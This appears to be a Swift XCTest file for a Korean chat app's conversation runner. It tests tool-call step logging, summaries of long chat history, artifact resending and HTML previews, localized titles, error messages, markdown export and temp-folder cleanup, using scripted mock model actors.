    func testEachToolCallIsLoggedWithWhatItLookedAtAndHowItEnded() async throws {
        let model = ArtifactCallModel(calls: [##"{"title":"주간 보고","format":"docx","content":"# 보고"}"##, #"{"title":"x","format":"pdf","content":"x"}"#])
        let runner = ChatRunner(client: model, tools: ChatTools(db: try .inMemory(), scope: .init()))
        let log = StepBox()
        _ = try await runner.run(history: [.init(conversationID: "t", role: "user", text: "만들어줘")], skillIDs: []) { await log.add($0) }
        let started = await log.started, finished = await log.finished
        XCTAssertEqual(started.map(\.detail), ["주간 보고", "x"])
        XCTAssertEqual(started.map(\.title), ["결과물 생성", "결과물 생성"])
        XCTAssertEqual(finished.map(\.0), started.map(\.id))
        XCTAssertEqual(finished.map(\.2), [false, true])
        XCTAssertTrue(finished[1].1.contains("도구 실행 실패"))
        XCTAssertEqual(ChatRunner.stepDetail(.init(id: "a", name: "summarize_period", arguments: #"{"from":"2026-11-09","to":"2026-11-13"}"#)), "2026-11-09 – 2026-11-13")
    }

    func testLongChatsSendASummaryOfWhatNoLongerFits() async throws {
        let long = String(repeating: "가", count: 9_000)
        var history: [ConversationMessage] = []
        for i in 0..<14 {
            history.append(.init(conversationID: "c", role: "user", text: "질문 \(i) " + long))
            history.append(.init(conversationID: "c", role: "assistant", text: "답 \(i) " + long))
        }
        history.append(.init(conversationID: "c", role: "user", text: "마지막 질문"))
        let model = MemoryModel()
        let runner = ChatRunner(client: model, tools: ChatTools(db: try .inMemory(), scope: .init()))
        let first = try await runner.run(history: history, skillIDs: []) { _ in }
        let memory = try XCTUnwrap(first.memory)
        XCTAssertEqual(memory.summary, "요약 1")
        let sent = await model.sent
        XCTAssertTrue(sent[0].contains("질문 0"), "the summary call gets the oldest messages")
        XCTAssertTrue(sent[1].hasPrefix("<earlier_conversation_summary>\n요약 1"))
        XCTAssertFalse(sent[1].contains("질문 0 "), "summarized messages aren't sent again")
        XCTAssertTrue(sent[1].contains("마지막 질문"))
        XCTAssertLessThanOrEqual(sent[1].count, ChatRunner.historyBudget + 200)

        // The next turn fits after the stored summary, so it is reused without another call.
        let next = history + [.init(conversationID: "c", role: "assistant", text: "짧은 답"), .init(conversationID: "c", role: "user", text: "또 질문")]
        let second = try await runner.run(history: next, skillIDs: [], memory: memory) { _ in }
        XCTAssertEqual(second.memory, memory)
        let calls = await model.sent.count
        XCTAssertEqual(calls, 3)

        // A short chat sends everything and makes no summary.
        let short = try await runner.run(history: [.init(conversationID: "s", role: "user", text: "안녕")], skillIDs: []) { _ in }
        XCTAssertNil(short.memory)
    }

    func testAFailedSummaryNeitherSendsAStaleOneNorSkipsMessages() async throws {
        let long = String(repeating: "가", count: 9_000)
        var history: [ConversationMessage] = []
        for i in 0..<14 {
            history.append(.init(conversationID: "c", role: "user", text: "질문 \(i) " + long))
            history.append(.init(conversationID: "c", role: "assistant", text: "답 \(i) " + long))
        }
        history.append(.init(conversationID: "c", role: "user", text: "마지막 질문"))
        let model = MemoryModel(failsSummary: true)
        let runner = ChatRunner(client: model, tools: ChatTools(db: try .inMemory(), scope: .init()))

        // The summarized message was edited away, so its summary must not come back.
        let stale = ChatMemory(summary: "지운 질문 요약", through: "deleted")
        let first = try await runner.run(history: history, skillIDs: [], memory: stale) { _ in }
        XCTAssertNil(first.memory)
        var sent = await model.sent
        XCTAssertFalse(sent.last!.contains("지운 질문 요약"))
        XCTAssertTrue(sent.last!.contains("마지막 질문"))

        // A valid summary keeps its boundary, so nothing after it is dropped.
        let valid = ChatMemory(summary: "앞 요약", through: history[1].id)
        let second = try await runner.run(history: history, skillIDs: [], memory: valid) { _ in }
        XCTAssertEqual(second.memory, valid)
        sent = await model.sent
        XCTAssertTrue(sent.last!.hasPrefix("<earlier_conversation_summary>\n앞 요약"))
        XCTAssertTrue(sent.last!.contains("질문 1 "))
    }

    func testOnlyTheLatestVersionOfARevisedArtifactIsResent() async throws {
        var first = ConversationMessage(conversationID: "c", role: "assistant", text: "초안")
        first.artifacts = [ChatArtifact(title: "보고", format: "docx", content: "옛 본문")]
        var revised = ChatArtifact(title: "보고", format: "docx", content: "새 본문")
        revised.baseID = first.artifacts[0].id
        var second = ConversationMessage(conversationID: "c", role: "assistant", text: "수정")
        second.artifacts = [revised]
        let model = MemoryModel()
        let runner = ChatRunner(client: model, tools: ChatTools(db: try .inMemory(), scope: .init()))
        _ = try await runner.run(history: [.init(conversationID: "c", role: "user", text: "만들어줘"), first,
                                           .init(conversationID: "c", role: "user", text: "고쳐줘"), second,
                                           .init(conversationID: "c", role: "user", text: "또 고쳐줘")], skillIDs: []) { _ in }
        let sent = await model.sent
        XCTAssertTrue(sent[0].contains("새 본문"))
        XCTAssertFalse(sent[0].contains("옛 본문"))
    }

    func testOfficeArtifactsPreviewAsHTML() {
        let deck = ChatArtifactHTML.render(.init(title: "d", format: "pptx", content: "# 하나\n- a\n## 둘\n- b"))
        XCTAssertEqual(deck.components(separatedBy: "<section>").count - 1, 2)
        XCTAssertTrue(ChatArtifactHTML.render(.init(title: "s", format: "xlsx", content: "A,<B>\n1,2")).contains("<td>&lt;B&gt;</td>"))
        XCTAssertTrue(ChatArtifactHTML.render(.init(title: "w", format: "docx", content: "# 제목")).contains("<h1>제목</h1>"))
    }

    func testTheNewQuestionIsSentWholeAndAStoppedAnswerStaysForContinuing() async throws {
        let question = String(repeating: "나", count: 20_000)
        let stopped = ConversationMessage(conversationID: "c", role: "assistant", text: "중간까지 쓴 답", status: "cancelled")
        let failed = ConversationMessage(conversationID: "c", role: "assistant", text: "실패 문구", status: "failed")
        let model = MemoryModel()
        let runner = ChatRunner(client: model, tools: ChatTools(db: try .inMemory(), scope: .init()))
        _ = try await runner.run(history: [.init(conversationID: "c", role: "user", text: "앞 질문"), stopped,
                                           .init(conversationID: "c", role: "user", text: "다른 질문"), failed,
                                           .init(conversationID: "c", role: "user", text: question)], skillIDs: []) { _ in }
        let calls = await model.sent
        let sent = try XCTUnwrap(calls.first)
        XCTAssertTrue(sent.contains(question))
        XCTAssertTrue(sent.contains("중간까지 쓴 답"))
        XCTAssertFalse(sent.contains("실패 문구"))
    }

    func testStepTitlesHaveEnglishAndTranslateEachPart() {
        for title in Array(ChatRunner.roleTitles.values) + Array(ChatRunner.toolTitles.values) {
            XCTAssertNotNil(L10n.english[title], title)
        }
        L10n.current = .en
        defer { L10n.current = .ko }
        XCTAssertEqual(ChatRunner.displayTitle("활동 조사 · 기록 검색"), "Activity research · Search records")
        XCTAssertEqual(ChatRunner.displayTitle("자료 조사 시작"), "Research started")
        XCTAssertEqual(ChatRunner.displayTitle("Slack 읽기"), "Read Slack")
        XCTAssertEqual(ChatRunner.displayTitle("웹 검색"), "Web search")
        XCTAssertEqual(ChatRunner.displayTitle("답변 작성 · 기록 검색 실패"), "Answer · Search records failed")
        XCTAssertEqual(ChatRunner.displayTitle("Slack 검색 실패"), "Search Slack failed")
        XCTAssertEqual(ChatRunner.displayTitle("대화 · 주간 회의"), "Chat · 주간 회의")
        XCTAssertEqual(ChatRunner.displayTitle("Claude Code 사용자 메시지"), "Claude Code user message")
        XCTAssertEqual(ChatRunner.displayTitle("Claude · Claude"), "Claude")
        XCTAssertEqual(ChatRunner.displayTitle("Claude · 주간 회의 · Claude"), "Claude · 주간 회의 · Claude")
    }

    func testChatFailureMapsCommonErrorsToOneSentence() {
        let rejected = ChatFailure.message(for: LLMError.http(401, "bad key"))
        XCTAssertEqual(rejected.text, "API 키나 로그인이 거부됐어요. 설정에서 확인해 주세요.")
        XCTAssertTrue(rejected.needsSettings)
        XCTAssertEqual(ChatFailure.message(for: LLMError.http(429, "")).text, "요청 한도에 걸렸어요. 잠시 뒤 다시 시도해 주세요.")
        XCTAssertFalse(ChatFailure.message(for: LLMError.http(429, "")).needsSettings)
        XCTAssertEqual(ChatFailure.message(for: LLMError.http(503, "")).text, "모델 서버에 문제가 있어요. 잠시 뒤 다시 시도해 주세요.")
        XCTAssertEqual(ChatFailure.message(for: URLError(.timedOut)).text, "모델 서버가 응답하지 않았어요. 서버 주소와 실행 상태를 확인해 주세요.")
        XCTAssertEqual(ChatFailure.message(for: URLError(.notConnectedToInternet)).text, "인터넷 연결이 끊겼어요. 연결을 확인하고 다시 시도해 주세요.")
        XCTAssertFalse(ChatFailure.needsSettings(CodexAuthError.transport("x").description))
        XCTAssertFalse(ChatFailure.message(for: CodexAuthError.transport("x")).needsSettings)
        XCTAssertTrue(ChatFailure.needsSettings("Codex 계정 정보가 없습니다. 설정에서 다시 로그인하세요."))
        let auth = ChatFailure.message(for: LLMError.auth("다시 로그인해주세요."))
        XCTAssertEqual(auth.text, "다시 로그인해주세요.")
        XCTAssertTrue(auth.needsSettings)
        let other = ChatFailure.message(for: LLMError.backend("x"))
        XCTAssertEqual(other.text, LLMError.backend("x").localizedDescription)
        XCTAssertFalse(other.needsSettings)

        XCTAssertTrue(ChatFailure.needsSettings("응답을 완료하지 못했습니다: " + rejected.text))
        XCTAssertTrue(ChatFailure.needsSettings(CodexAuthError.reloginRequired("revoked").description))
        XCTAssertFalse(ChatFailure.needsSettings(other.text))
        L10n.current = .en
        defer { L10n.current = .ko }
        XCTAssertTrue(ChatFailure.needsSettings(ChatFailure.message(for: LLMError.http(403, "")).text))
        XCTAssertTrue(ChatFailure.needsSettings(CodexAuthError.notLoggedIn.description))
    }

    func testConversationMarkdownKeepsEachAnswersSources() {
        var answer = ConversationMessage(conversationID: "c", role: "assistant", text: "정리했습니다 [observation:1]")
        answer.sources = [.init(id: "observation:1", title: "주간 회의", location: "https://example.com/a", excerpt: "x"), .init(id: "card:2", title: "메모", location: "", excerpt: "")]
        let running = ConversationMessage(conversationID: "c", role: "assistant", text: "작성 중", status: "running")
        let markdown = ConversationMessage.markdown(title: "보고", messages: [
            .init(conversationID: "c", role: "user", text: "정리해줘"), answer,
            .init(conversationID: "c", role: "user", text: "더"), running,
        ])
        XCTAssertEqual(markdown, "# 보고\n\n## 질문\n\n정리해줘\n\n## 답변\n\n정리했습니다 [observation:1]\n\n**출처**\n\n- [observation:1] 주간 회의 — https://example.com/a\n- [card:2] 메모\n\n## 질문\n\n더\n")
        XCTAssertEqual(ConversationMessage(conversationID: "c", role: "assistant", text: "a").markdown, "a")
    }

    func testOnlyStaleCodexFoldersAreRemoved() throws {
        let root = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString, isDirectory: true)
        defer { try? FileManager.default.removeItem(at: root) }
        let old = root.appendingPathComponent("sillog-codex-old"), new = root.appendingPathComponent("sillog-codex-new")
        let other = root.appendingPathComponent("other")
        for folder in [old, new, other] { try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true) }
        for folder in [old, other] {
            try FileManager.default.setAttributes([.modificationDate: Date().addingTimeInterval(-2 * 86_400)], ofItemAtPath: folder.path)
        }
        CodexRuntime.removeStaleDirectories(in: root)
        XCTAssertFalse(FileManager.default.fileExists(atPath: old.path))
        XCTAssertTrue(FileManager.default.fileExists(atPath: new.path), "a run in progress keeps its folder")
        XCTAssertTrue(FileManager.default.fileExists(atPath: other.path))
    }

    func testFollowUpQuestionKeepsFirstCleanLine() async throws {
        XCTAssertEqual(ChatBackend.followUpLine("\n  \"- 다음 주 일정도 정리해 줘?\"\n설명"), "다음 주 일정도 정리해 줘?")
        XCTAssertNil(ChatBackend.followUpLine(" \n\"\" "))
        XCTAssertEqual(ChatBackend.followUpLine(String(repeating: "가", count: 80))?.count, 60)
        let model = PromptCapture()
        let question = try await ChatBackend.model(model).followUpQuestion(question: "오늘 한 일", answer: "정리했어요")
        XCTAssertEqual(question, "완료")
        let prompts = await model.prompts
        XCTAssertTrue(prompts.first?.contains("follow-up question") == true)
    }
}

/// Answers the memory prompt with numbered summaries and records what each call got.
private actor MemoryModel: ChatModelClient {
    nonisolated var modelName: String { "memory" }
    var sent: [String] = []
    var summaries = 0
    let failsSummary: Bool
    init(failsSummary: Bool = false) { self.failsSummary = failsSummary }
    func respond(system: String, messages: [ChatModelMessage], tools: [ToolSpec], onText: @escaping @Sendable (String) async -> Void) async throws -> ChatModelReply {
        sent.append(messages.map(\.text).joined(separator: "\n"))
        if system == ChatRunner.memoryPrompt, failsSummary { throw URLError(.timedOut) }
        if system == ChatRunner.memoryPrompt { summaries += 1; return .init(text: "요약 \(summaries)") }
        return .init(text: "답")
    }
}

private actor StepBox {
    var started: [ChatStep] = []
    var finished: [(String, String, Bool)] = []
    func add(_ event: ChatRunEvent) {
        if case .stepStarted(let step) = event { started.append(step) }
        if case .stepFinished(let id, let result, let failed) = event { finished.append((id, result, failed)) }
    }
}

private actor EventBox {
    var items: [ChatArtifact] = []
    func add(_ item: ChatArtifact) { items.append(item) }
}

/// Calls create_artifact once per scripted argument string, then finishes.
private actor ArtifactCallModel: ChatModelClient {
    nonisolated var modelName: String { "artifact-calls" }
    let calls: [String]
    var replies: [String] = []
    var firstRequest = ""
    init(calls: [String]) { self.calls = calls }
    func respond(system: String, messages: [ChatModelMessage], tools: [ToolSpec], onText: @escaping @Sendable (String) async -> Void) async throws -> ChatModelReply {
        if firstRequest.isEmpty { firstRequest = messages.map(\.text).joined(separator: "\n") }
        if messages.last?.role == "tool" { replies.append(messages.last?.text ?? "") }
        let done = messages.filter { $0.role == "tool" }.count
        guard done < calls.count else { return .init(text: "완료") }
        return .init(text: "", calls: [.init(id: "c\(done)", name: "create_artifact", arguments: calls[done])])
    }
}


private actor ScriptedChatModel: ChatModelClient {
    nonisolated var modelName: String { "scripted" }
    var requests: [String] = []
    var systems: [String] = []
    /// Args: system·messages·tools는 실행기의 요청, onText는 사용하지 않는 모의 콜백이다.
    /// Returns: 위임 → 실제 기록 검색 → 결과물 생성 순서의 모의 응답.
    /// Raises: 없음.
    func respond(system: String, messages: [ChatModelMessage], tools: [ToolSpec], onText: @escaping @Sendable (String) async -> Void) async throws -> ChatModelReply {
        requests.append(messages.first?.text ?? ""); systems.append(system)
        if messages.first?.text == "하위 작업" {
            if messages.last?.role == "tool" { return .init(text: "조회 결과 없음") }
            return .init(text: "", calls: [.init(id: "search", name: "search_context", arguments: #"{"query":"","from":"","to":""}"#)])
        }
        if messages.contains(where: { $0.calls.contains { $0.name == "create_artifact" } }) { return .init(text: "완료") }
        if messages.last?.role == "tool" { return .init(text: "", calls: [.init(id: "artifact", name: "create_artifact", arguments: ##"{"title":"결과","format":"markdown","content":"# 결과"}"##)]) }
        return .init(text: "", calls: [.init(id: "delegate", name: "delegate", arguments: #"{"tasks":[{"role":"context","task":"하위 작업"}]}"#)])
    }
}


private actor PromptCapture: ChatModelClient {
    nonisolated var modelName: String { "prompt-capture" }
    var prompts: [String] = []

    func respond(system: String, messages: [ChatModelMessage], tools: [ToolSpec],
                 onText: @escaping @Sendable (String) async -> Void) async throws -> ChatModelReply {
        prompts.append(system)
        return .init(text: "완료")
    }
}

private actor WebReadModel: ChatModelClient {
    nonisolated var modelName: String { "web-read" }
    let url: String
    var toolReply = ""
    init(url: String) { self.url = url }

    func respond(system: String, messages: [ChatModelMessage], tools: [ToolSpec],
                 onText: @escaping @Sendable (String) async -> Void) async throws -> ChatModelReply {
        if let last = messages.last, last.role == "tool" { toolReply = last.text; return .init(text: "완료") }
        return .init(text: "", calls: [.init(id: "read", name: "web_read", arguments: #"{"url":"\#(url)"}"#)])
    }
}

final class ChatStartupQueryTests: XCTestCase {
    func testFirstMessageAndArtifactMessagesReadOnlyWhatTheyNeed() throws {
        let store = ChatStore(try .inMemory())
        var conversation = ChatConversation(); conversation.title = "보고서"
        let question = ConversationMessage(conversationID: conversation.id, role: "user", text: "보고서 써줘")
        var answer = ConversationMessage(conversationID: conversation.id, role: "assistant", text: "완료")
        answer.createdAt = question.createdAt + 1
        answer.artifacts = [ChatArtifact(title: "보고서", format: "markdown", content: "# 결과")]
        try store.startTurn(conversation: conversation, user: question, answer: answer)
        var later = ConversationMessage(conversationID: conversation.id, role: "user", text: "고마워")
        later.createdAt += 10
        try store.save(later)
        XCTAssertEqual(try store.firstMessage(conversation.id)?.text, "보고서 써줘")
        XCTAssertEqual(try store.messagesWithArtifacts().map(\.id), [answer.id])
    }
}
